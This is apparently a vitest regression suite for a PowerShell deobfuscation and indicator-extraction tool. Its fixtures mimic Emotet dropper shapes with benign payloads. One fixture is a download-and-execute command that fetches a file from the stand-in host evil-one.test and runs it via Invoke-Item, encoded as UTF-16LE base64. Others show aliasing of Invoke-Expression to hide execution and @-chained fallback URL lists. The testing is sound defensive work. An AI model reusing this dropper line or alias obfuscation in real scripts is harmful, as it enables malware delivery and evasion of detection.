import { describe, expect, it } from 'vitest';

import { analyze } from '../analyze';
import { deobfuscate } from '../eval/pipeline';

// Shapes found by running real Emotet droppers through Husk. The samples
// themselves are deliberately not committed - these reproduce the structure
// with benign payloads, which is what the regressions actually need.

const utf16leBase64 = (text: string): string => {
  const bytes = new Uint8Array(text.length * 2);
  for (let i = 0; i < text.length; i += 1) {
    const code = text.charCodeAt(i);
    bytes[i * 2] = code & 0xff;
    bytes[i * 2 + 1] = (code >> 8) & 0xff;
  }
  return btoa(String.fromCharCode(...bytes));
};

describe('a bare base64 blob is a sample, not noise', () => {
  // Real droppers arrive this way constantly: lifted out of a macro or an EDR
  // command-line field with the -enc already stripped. Before this, Husk
  // matched nothing and reported a false clean.
  const payload = `$p = $env:userprofile + '\\403.exe'; $w = New-Object Net.WebClient; $w.DownloadFile('http://evil-one.test/a/','$p'); Invoke-Item $p`;

  it('decodes a bare UTF-16LE blob', async () => {
    const result = await analyze(utf16leBase64(payload));
    expect(result.layers.length).toBeGreaterThan(1);
    expect(result.iocs.indicators.some((i) => i.value.includes('evil-one.test'))).toBe(true);
  });

  it('records the host calls inside it', async () => {
    const result = await analyze(utf16leBase64(payload));
    const signatures = result.events.map((e) => e.signature);
    expect(signatures).toContain('Net.WebClient.DownloadFile');
    expect(signatures).toContain('Invoke-Item');
  });

  it('ignores short or non-base64 text', async () => {
    const result = await analyze('Write-Host "hello"');
    expect(result.layers).toHaveLength(1);
  });
});

describe('a run that matched nothing is never reported as clean', () => {
  // The worst possible outcome: analysing nothing and calling it resolved.
  it('records a gap when no rule matched', async () => {
    const result = await deobfuscate('\u0001\u0002 not powershell at all \u0003');
    expect(result.reliable).toBe(false);
    expect(result.trace.gaps.ranked().some((g) => /no rule matched/.test(g.signature))).toBe(true);
  });

  it('does not fire on an ordinary script that needed no unwrapping', async () => {
    const result = await deobfuscate('Write-Host "hello"');
    expect(result.trace.gaps.ranked().some((g) => /no rule matched/.test(g.signature))).toBe(false);
  });
});

describe('@-separated URL lists', () => {
  // Emotet packs its fallbacks as a@b@c. '@' is legal in a URL, so a greedy
  // match swallowed the whole chain as a single indicator.
  const list =
    "$u = 'http://one.test/aa/@http://two.test/bb/@https://three.test/cc/@http://four.test/dd/'";

  it('splits the chain into separate indicators', async () => {
    const urls = (await analyze(list)).iocs.indicators
      .filter((i) => i.kind === 'url')
      .map((i) => i.value);

    expect(urls).toHaveLength(4);
    expect(urls).toContain('http://one.test/aa/');
    expect(urls).toContain('https://three.test/cc/');
    expect(urls.every((u) => !u.includes('@'))).toBe(true);
  });

  it('keeps a legitimate userinfo @ inside one URL', async () => {
    const urls = (await analyze(`$u = 'http://user:pw@host.test/a'`)).iocs.indicators
      .filter((i) => i.kind === 'url')
      .map((i) => i.value);
    expect(urls).toContain('http://user:pw@host.test/a');
  });
});

describe('hostname fragments are rejected', () => {
  // An intermediate layer can hold a URL split across a concatenation,
  // yielding 'http://madd' - a fragment, not a destination.
  it('drops a host with no dot', async () => {
    const urls = (await analyze(`$a = 'http://madd' + 'inhost.test/x'`)).iocs.indicators
      .filter((i) => i.kind === 'url')
      .map((i) => i.value);
    expect(urls.some((u) => u === 'http://madd')).toBe(false);
  });

  it('keeps a bare IP host', async () => {
    const urls = (await analyze(`$u = 'http://203.0.113.5/a'`)).iocs.indicators
      .filter((i) => i.kind === 'url')
      .map((i) => i.value);
    expect(urls).toContain('http://203.0.113.5/a');
  });
});

describe('pathological input does not crash the extractor', () => {
  // A hex-encoded PE reads as dotted labels and matched the domain rule.
  // Building a RegExp out of that matched text threw "Invalid regular
  // expression" on real samples - escaping is not a fix when the text is
  // unbounded, so the check is a plain substring search now.
  it('survives a hex blob that parses as a dotted hostname', async () => {
    const hexPe = `4d5a90${'.g'.repeat(4000)}.com`;
    await expect(analyze(`$b = '${hexPe}'`)).resolves.toBeDefined();
  });

  it('rejects an over-length hostname rather than reporting it', async () => {
    const huge = `${'a.'.repeat(200)}com`;
    const domains = (await analyze(`$x = '${huge}'`)).iocs.indicators
      .filter((i) => i.kind === 'domain')
      .map((i) => i.value);
    expect(domains.every((d) => d.length <= 253)).toBe(true);
  });

  it('still suppresses a domain already captured inside a URL', async () => {
    const indicators = (await analyze(`$u = 'http://evil.test/a'`)).iocs.indicators;
    expect(indicators.filter((i) => i.kind === 'domain' && i.value === 'evil.test')).toHaveLength(0);
    expect(indicators.some((i) => i.kind === 'url')).toBe(true);
  });

  it('still reports a bare domain that is not part of a URL', async () => {
    const domains = (await analyze(`$h = 'badhost.top'`)).iocs.indicators
      .filter((i) => i.kind === 'domain')
      .map((i) => i.value);
    expect(domains).toContain('badhost.top');
  });
});

describe('aliased Invoke-Expression', () => {
  // Real MalwareBazaar samples alias a computed name to IEX and invoke
  // through it. Husk saw no execution sink, decoded nothing, and - because
  // the script tokenises cleanly - reported an unremarkable clean result.
  it('resolves an alias built by string replacement', async () => {
    const sample = `$t0='ZE95'.replace('Z','I').replace('95','x');sal g $t0;g ('Write-Host ' + '"pwned"')`;
    const result = await analyze(sample);
    expect(result.output).toContain('Write-Host');
    expect(result.output).toContain('pwned');
  });

  it.each([
    ['sal', `sal q 'IEX'; q ('Write-Host 1')`],
    ['Set-Alias', `Set-Alias q 'IEX'; q ('Write-Host 1')`],
    ['New-Alias', `New-Alias q 'IEX'; q ('Write-Host 1')`],
    ['named parameters', `Set-Alias -Name q -Value 'Invoke-Expression'; q ('Write-Host 1')`],
  ])('handles %s', async (_label, sample) => {
    expect((await analyze(sample)).output).toContain('Write-Host 1');
  });

  it('resolves an alias used as a pipeline sink', async () => {
    const sample = `sal q 'IEX'; ('Write-Host ' + '2') | q`;
    expect((await analyze(sample)).output).toContain('Write-Host 2');
  });

  it('does not treat an alias to something else as an execution sink', async () => {
    // Constant folding still applies - ('some' + 'path') becomes 'somepath' -
    // but the alias must not produce an *invocation* layer, which would
    // replace the script with its own argument.
    const result = await analyze(`sal ll 'Get-ChildItem'; ll ('some' + 'path')`);
    expect(result.output).toContain('ll');
    expect(result.layers.some((l) => l.origin.via === 'invoke')).toBe(false);
  });
});

describe('hex-word hostnames are not mistaken for IP addresses', () => {
  // Many English words are pure hexadecimal, so a '[0-9a-f:]' test let
  // concatenation fragments like 'http://bad' pass as literal addresses and
  // defeat the hostname-fragment filter entirely.
  it.each(['bad', 'face', 'dead', 'beef', 'cafe', 'add'])(
    'rejects the fragment http://%s',
    async (word) => {
      const urls = (await analyze(`$a = 'http://${word}' + 'host.test/x'`)).iocs.indicators
        .filter((i) => i.kind === 'url')
        .map((i) => i.value);
      expect(urls).not.toContain(`http://${word}`);
    },
  );

  it('still keeps a real IPv4 host', async () => {
    const urls = (await analyze(`$u = 'http://198.51.100.7/a'`)).iocs.indicators
      .filter((i) => i.kind === 'url')
      .map((i) => i.value);
    expect(urls).toContain('http://198.51.100.7/a');
  });

  // An out-of-range quad is not an IP, but it is still a dotted host and so
  // still a destination worth reporting as a URL. What it must not do is
  // claim to be an IP indicator.
  it('does not report an out-of-range quad as an IP indicator', async () => {
    const ips = (await analyze(`$u = 'http://999.1.1.1/a'`)).iocs.indicators
      .filter((i) => i.kind === 'ipv4')
      .map((i) => i.value);
    expect(ips).not.toContain('999.1.1.1');
  });

  it('still keeps a bracketed IPv6 host', async () => {
    const urls = (await analyze(`$u = 'http://[2001:db8::1]/a'`)).iocs.indicators
      .filter((i) => i.kind === 'url')
      .map((i) => i.value);
    expect(urls.some((u) => u.includes('2001:db8'))).toBe(true);
  });

  // localhost is in BENIGN_HOSTS on purpose: in a sample it is scaffolding,
  // not a destination.
  it('filters localhost as scaffolding rather than a destination', async () => {
    const urls = (await analyze(`$u = 'http://localhost:8080/a'`)).iocs.indicators
      .filter((i) => i.kind === 'url')
      .map((i) => i.value);
    expect(urls).toHaveLength(0);
  });
});
